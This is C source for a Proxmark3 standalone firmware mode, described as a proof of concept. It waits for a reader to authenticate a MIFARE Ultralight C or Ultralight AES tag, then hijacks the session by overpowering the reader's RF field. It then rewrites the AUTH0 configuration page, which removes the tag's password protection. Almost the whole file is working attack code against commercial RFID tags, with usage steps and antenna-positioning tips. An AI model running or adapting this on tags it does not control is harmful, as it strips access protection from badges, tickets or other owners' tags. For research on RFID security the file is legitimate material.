//-----------------------------------------------------------------------------
// Copyright (C) Philippe Teuwen, 2026
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
//
// Standalone mode: unlock Ultralight C / AES tags
//
// Disclaimer:
//   This is a proof of concept, not a polished tool.
//
// Description:
//   It attempts to take over an authenticated session between a reader and
//   an Ultralight C or Ultralight AES tag, and rewrite the AUTH0 page to unlock the tag.
//   In principle, this requires a relay attack implying two Proxmark3 devices,
//   but this code allows to do it with a single Proxmark3.
//
// Principle of operation:
//   It starts as a sniffer, waiting for an authentication between a reader and a tag.
//   Once it detects the tag's response to the authentication challenge,
//   it quickly switches to reader mode to take over the reader field.
//   If the tag is positioned to have a much stronger coupling with the Proxmark3
//   than with the reader, the Proxmark3 field will obliterate the reader field,
//   keeping the tag powered and blocking the reader's commands.
//   Then, once the reader is moved away, the Proxmark3 can send the command to rewrite AUTH0.
//
// Relative positions are important:
// - Ensure a good coupling between tag and RDV4
// - Try to get the reader authenticating the tag from as far as possible, with the RDV4 directly behind the tag
// - Still, you may need to come a bit closer if the RDV4 cannot sniff properly the communication
//
// Limitations:
// - So far, it only works with RDV4 (which has a 9V antenna driver vs. the 5V of Easy versions)
// - ULC: only if AUTH0 not locked (Lock byte 3, bit 1=0)
// - ULAES: only if SEC_MSG_ACT=0 and LOCK_USR_CFG=0
//
// Tested modes:
// - RDV4 + ULC   + Android with TagInfo
// - RDV4 + ULAES + RDV4 "hf mfu rdbl --key"
//
// Usage:
//     LEDS: 0 = off, 1 = on, * = blink                                 A B C D
//     ------------------------------------------------------------------------
//     Start standalone mode                                         => * 0 0 1
//     Place an Ultralight C or Ultralight AES tag on the Proxmark3
//         if the pm3 detects an UL-C or an UL-AES:                  => 1 * 0 0
//     Bring tag and pm3 slowly towards the authenticating reader
//         if the pm3 detects a successful authentication:           => 1 1 * 0
//     Pull the tag and Proxmark3 together away from the reader
//     Press the button 1 second and release it
//         if the pm3 managed to rewrite AUTH0:                      => 1 1 1 1
//         if it failed to write AUTH0, D will blink very fast       => 1 1 1 *
//     Press the button and release it
//         exit standalone mode                                      => 0 0 0 0


#include "standalone.h" // standalone definitions
#include "proxmark3_arm.h"
#include "fpgaloader.h"
#include "iso14443a.h"
#include "util.h"
#include "appmain.h"
#include "dbprint.h"
#include "ticks.h"
#include "protocols.h"
#include "mifareutil.h"
#include "string.h"
#include "commonutil.h"
#include "BigBuf.h"

#define DELAY_READER_AIR2ARM_AS_SNIFFER (2 + 3 + 8)
#define DELAY_TAG_AIR2ARM_AS_SNIFFER (3 + 14 + 8)

typedef enum {
    ST_LOOK_FOR_CARD = 0,
    ST_SNIFF_AUTH,
    ST_WAIT_BUTTON,
    ST_WAIT_BUTTON_RELEASE,
    ST_WRITE_AUTH0,
    ST_EXIT
} state_t;

typedef enum {
    TAG_NONE = 0,
    TAG_ULC,
    TAG_ULAES,
    TAG_OTHER
} tag_t;

static void blink_led_slow(uint8_t led) {
    LED(led, 1);
    SpinDelay(200);
    LED(led, 0);
    SpinDelay(200);
}

static void blink_led_fast(uint8_t led) {
    LED(led, 1);
    SpinDelay(40);
    LED(led, 0);
    SpinDelay(40);
}

static bool find_tag(tag_t *tag_type) {
    *tag_type = TAG_NONE;
    iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);
    LED_D_OFF();
    iso14a_card_select_t card;
    if (iso14443a_select_card(NULL, &card, NULL, true, 0, true) == false) {
        goto out;
    }
    // Dbprintf("Found card with SAK: %02X, ATQA: %02X %02X", card.sak, card.atqa[0], card.atqa[1]);
    if (card.sak != 0x00 || card.atqa[0] != 0x44 || card.atqa[1] != 0x00) {
        *tag_type = TAG_OTHER;
        // DbpString("Not an Ultralight C / Ultralight AES tag. Ignoring...");
        goto out;
    }
    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    LED_D_OFF();
    if (iso14443a_select_card(NULL, &card, NULL, true, 0, true) == false) {
        goto out;
    }
    uint8_t version[10] = {0x00};
    uint16_t version_len = 0;
    uint8_t version_cmd[3] = {MIFARE_ULEV1_VERSION, 0x00, 0x00};
    AddCrc14A(version_cmd, sizeof(version_cmd) - 2);
    ReaderTransmit(version_cmd, sizeof(version_cmd), NULL);
    version_len = ReaderReceive(version, ARRAYLEN(version), NULL);
    switch (version_len) {
        case 0x0A: {
            if ((memcmp(version, "\x00\x04\x03\x01\x04\x00\x0F\x03", 8) == 0) ||
                (memcmp(version, "\x00\x04\x03\x02\x04\x00\x0F\x03", 8) == 0) ||
                (memcmp(version, "\x00\x04\x03\x03\x04\x00\x0F\x03", 8) == 0)) {
                *tag_type = TAG_ULAES;
                // DbpString("Found Ultralight AES");
            }
            break;
        }
        case 0x01: {
            if (iso14443a_select_card(NULL, &card, NULL, true, 0, true) == false) {
                goto out;
            }
            uint8_t resp[19] = {0x00}; // 19 in case somehow an UL-AES reaches here
            uint16_t resp_len = 0;
            uint8_t auth_cmd[4] = {MIFARE_ULC_AUTH_1, 0x00, 0x00, 0x00};
            AddCrc14A(auth_cmd, sizeof(auth_cmd) - 2);
            ReaderTransmit(auth_cmd, sizeof(auth_cmd), NULL);
            resp_len = ReaderReceive(resp, ARRAYLEN(resp), NULL);
            if (resp_len == 11) {
                *tag_type = TAG_ULC;
                // DbpString("Found Ultralight C");
            }
            break;
        }
        default:
            *tag_type = TAG_OTHER;
            // DbpString("Not an Ultralight C / Ultralight AES tag. Ignoring...");
            break;
    }
out:
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    return *tag_type != TAG_NONE;
}

// Derived from SniffIso14443a, but only sniffing tag responses
// wait for mutual auth and check for RndA' size
static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {

    iso14443a_setup(FPGA_HF_ISO14443A_SNIFFER);

    // Allocate memory from BigBuf for some buffers
    // free all previous allocations first
    BigBuf_free();
    BigBuf_Clear_ext(false);
    bool found_rnda_reply = false;
    bool found_auth_key0 = false;

    // The command (reader -> tag) that we're receiving.
    uint8_t *receivedCmd = BigBuf_calloc(MAX_FRAME_SIZE);
    uint8_t *receivedCmdPar = BigBuf_calloc(MAX_PARITY_SIZE);

    // The response (tag -> reader) that we're receiving.
    uint8_t *receivedResp = BigBuf_calloc(MAX_FRAME_SIZE);
    uint8_t *receivedRespPar = BigBuf_calloc(MAX_PARITY_SIZE);

    uint8_t previous_data = 0;
    int maxDataLen = 0, dataLen;
    bool TagIsActive = false;
    bool ReaderIsActive = false;

    // Set up the demodulator for tag -> reader responses.
    Demod14aInit(receivedResp, MAX_FRAME_SIZE, receivedRespPar);

    // Set up the demodulator for the reader -> tag commands
    Uart14aInit(receivedCmd, MAX_FRAME_SIZE, receivedCmdPar);

    // The DMA buffer, used to stream samples from the FPGA
    dmabuf8_t *dma = get_dma8();
    uint8_t *data = dma->buf;

    // Setup and start DMA.
    if (FpgaSetupSscDma((uint8_t *) dma->buf, DMA_BUFFER_SIZE) == false) {
        if (g_dbglevel > DBG_ERROR) Dbprintf("FpgaSetupSscDma failed. Exiting");
        goto out;
    }

    uint32_t rx_samples = 0;

    tUart14a *uart = GetUart14a();
    tDemod14a *demod = GetDemod14a();

    // loop and listen
    uint32_t ledb_counter = 0;
    while (BUTTON_PRESS() == false) {
        register int readBufDataP = data - dma->buf;
        register int dmaBufDataP = DMA_BUFFER_SIZE - AT91C_BASE_PDC_SSC->PDC_RCR;
        if (readBufDataP <= dmaBufDataP) {
            dataLen = dmaBufDataP - readBufDataP;
        } else {
            dataLen = DMA_BUFFER_SIZE - readBufDataP + dmaBufDataP;
        }

        // test for length of buffer
        if (dataLen > maxDataLen) {
            maxDataLen = dataLen;
            if (dataLen > (9 * DMA_BUFFER_SIZE / 10)) {
                Dbprintf("[!] blew circular buffer! | datalen %u counter %u", dataLen, ledb_counter);
                break;
            }
        }
        if (dataLen < 1) {
            continue;
        }
        WDT_HIT();
        if (ledb_counter++ > 100000) {
            LED_B_INV();
            ledb_counter = 0;
        }

        // primary buffer was stopped( <-- we lost data!
        if (AT91C_BASE_PDC_SSC->PDC_RCR == 0) {
            AT91C_BASE_PDC_SSC->PDC_RPR = (uint32_t) dma->buf;
            AT91C_BASE_PDC_SSC->PDC_RCR = DMA_BUFFER_SIZE;
            // Dbprintf("[-] RxEmpty ERROR | data length %d", dataLen); // temporary
        }
        // secondary buffer sets as primary, secondary buffer was stopped
        if (AT91C_BASE_PDC_SSC->PDC_RNCR == 0) {
            AT91C_BASE_PDC_SSC->PDC_RNPR = (uint32_t) dma->buf;
            AT91C_BASE_PDC_SSC->PDC_RNCR = DMA_BUFFER_SIZE;
        }

        // Need two samples to feed Miller and Manchester-Decoder
        if (rx_samples & 0x01) {

            if (!TagIsActive) { // no need to try decoding reader data if the tag is sending
                uint8_t readerdata = (previous_data & 0xF0) | (*data >> 4);

                if (MillerDecoding(readerdata, (rx_samples - 1) * 4)) {
                    // Dbprintf("Received reader command (%i):", uart->len);
                    // Dbhexdump(uart->len, receivedCmd, 0);
                    if (type == TAG_ULAES && uart->len == 4 && receivedCmd[0] == 0x1A) {
                        if (receivedCmd[1] == 0x00) {
                            found_auth_key0 = true;
                        } else if ((receivedCmd[1] == 0x01) || (receivedCmd[1] == 0x02)) {
                            // Ignore authentications with UIDRetrKey or OriginalityKey
                            // as they won't allow rewriting AUTH0
                            found_auth_key0 = false;
                        }
                    }
                    // ready to receive another command
                    Uart14aReset();
                    // reset the demod code, which might have been
                    // false-triggered by the commands from the reader
                    Demod14aReset();
                }
                ReaderIsActive = (uart->state != STATE_14A_UNSYNCD);
            }

            // no need to try decoding tag data if the reader is sending - and we cannot afford the time
            if (!ReaderIsActive) {
                uint8_t tagdata = (previous_data << 4) | (*data & 0x0F);
                if (ManchesterDecoding(tagdata, 0, (rx_samples - 1) * 4)) {
                    // Dbprintf("Received tag response (%i):", demod->len);
                    // Dbhexdump(demod->len, receivedResp, 0);

                    // Watch for RNDA': 1+8+2 (ULC) or 1+16+2 (ULAES)
                    if (type == TAG_ULC && demod->len == 11 && receivedResp[0] == 0x00) {
                        found_rnda_reply = true;
                        goto out;
                    } else if (type == TAG_ULAES && found_auth_key0 && demod->len == 19 && receivedResp[0] == 0x00) {
                        found_rnda_reply = true;
                        found_auth_key0 = false;
                        goto out;
                    }

                    // ready to receive another response.
                    Demod14aReset();
                    // reset the Miller decoder including its (now outdated) input buffer
                    Uart14aReset();
                    // UartInit(receivedCmd, receivedCmdPar);
                }
                TagIsActive = (demod->state != DEMOD_14A_UNSYNCD);
            }
        }

        previous_data = *data;
        rx_samples++;
        data++;
        if (data == dma->buf + DMA_BUFFER_SIZE) {
            data = dma->buf;
        }
    } // end main loop
out:
    if (found_rnda_reply) {
        // Bring HF on to take over reader field
        iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
        LED_D_OFF();
    } else {
        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    }
    FpgaDisableTracing();
    FpgaDisableSscDma();
    return found_rnda_reply;
}

static bool write_auth0(tag_t type) {
    // Write AUTH0 depending on tag type
    // UL-C:   block 0x2A -> 30000000
    // UL-AES: block 0x29 -> 0000003C
    bool success = false;
    uint8_t cmd[8] = {MIFARE_ULC_WRITE};
    if (type == TAG_ULC) {
        cmd[1] = 0x2A;
        cmd[2] = 0x30; cmd[3] = 0x00; cmd[4] = 0x00; cmd[5] = 0x00;
    } else if (type == TAG_ULAES) {
        cmd[1] = 0x29;
        cmd[2] = 0x00; cmd[3] = 0x00; cmd[4] = 0x00; cmd[5] = 0x3C;
    } else {
        goto out;
    }

    uint8_t resp[1] = {0x00};
    uint16_t resp_len = 0;
    AddCrc14A(cmd, 6);
    ReaderTransmit(cmd, sizeof(cmd), NULL);
    resp_len = ReaderReceive(resp, ARRAYLEN(resp), NULL);
    // Dbprintf("Write AUTH0 resp(%u): %02X", resp_len, resp[0]);
    if (resp_len == 1 && resp[0] == 0x0A) {
        success = true;
    }

out:
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    return success;
}

void ModInfo(void) {
    DbpString("Ultralight C / Ultralight AES unlocker by Philippe Teuwen");
}

void RunMod(void) {
    state_t state = ST_LOOK_FOR_CARD;
    tag_t tag_type = TAG_NONE;

    StandAloneMode();
    Dbprintf("Doegox Ultralight C / Ultralight AES unlocker started");
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
    LEDsoff();
    bool welcome_state_look = true;
    bool welcome_state_sniff = true;
    bool welcome_state_button = true;

    for (;;) {
        if (state == ST_EXIT || ((state != ST_WAIT_BUTTON) && (state != ST_WAIT_BUTTON_RELEASE) && BUTTON_PRESS())) {
            break;
        }

        switch (state) {
        case ST_LOOK_FOR_CARD: {
            if (welcome_state_look) {
                Dbprintf("Place an Ultralight C or Ultralight AES tag on the Proxmark3.");
                welcome_state_look = false;
            }
            blink_led_slow(LED_A);
            if (find_tag(&tag_type)) {
                if (tag_type == TAG_ULC) {
                    DbpString("Found Ultralight C tag!");
                    state = ST_SNIFF_AUTH;
                    // SpinDelay(1000);
                    break;
                }else if (tag_type == TAG_ULAES) {
                    DbpString("Found Ultralight AES tag!");
                    state = ST_SNIFF_AUTH;
                    // SpinDelay(1000);
                    break;
                } else {
                    DbpString("Found other tag type, ignoring...");
                    uint32_t t0 = GetTickCount();
                    while (GetTickCount() - t0 < 2000) {
                        blink_led_fast(LED_A);
                    }
                }
            }
            break;
        }
        case ST_SNIFF_AUTH: {
            if (welcome_state_sniff) {
                Dbprintf("Bring the tag and Proxmark3 together slowly towards the authenticating reader.");
                welcome_state_sniff = false;
            }
            LED_A_ON();
            LED_B_ON();
            if (sniff_wait_for_rnda_reply(tag_type)) {
                LED_B_ON();
                LED_C_ON();
                DbpString("Card is authenticated!");
                state = ST_WAIT_BUTTON;
            }
            break;
        }
        case ST_WAIT_BUTTON: {
            if (welcome_state_button) {
                Dbprintf("Pull the tag and Proxmark3 together away from the reader, then press the button.");
                welcome_state_button = false;
            }
            LED_A_ON();
            LED_B_ON();
            blink_led_slow(LED_C);
            if (BUTTON_PRESS()) {
                state = ST_WAIT_BUTTON_RELEASE;
            }
            break;
        }
        case ST_WAIT_BUTTON_RELEASE: {
            LED_A_ON();
            LED_B_ON();
            blink_led_slow(LED_C);
            if (BUTTON_PRESS() == false) {
                state = ST_WRITE_AUTH0;
            }
            break;
        }
        case ST_WRITE_AUTH0: {
            LED_A_ON();
            LED_B_ON();
            LED_C_ON();
            if (write_auth0(tag_type)) {
                Dbprintf("AUTH0 written! Press the button to exit.");
                LED_D_ON();
                while (!BUTTON_PRESS()) {}
            } else {
                Dbprintf("AUTH0 write failed. Press the button to exit.");
                while (!BUTTON_PRESS()) {
                    blink_led_fast(LED_D);
                }
            }
            state = ST_EXIT;
            break;
        }
        case ST_EXIT:
            break;
        default:
            state = ST_LOOK_FOR_CARD;
            break;
        }
        WDT_HIT();
    }

    DbpString("Exiting");
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    LEDsoff();
}
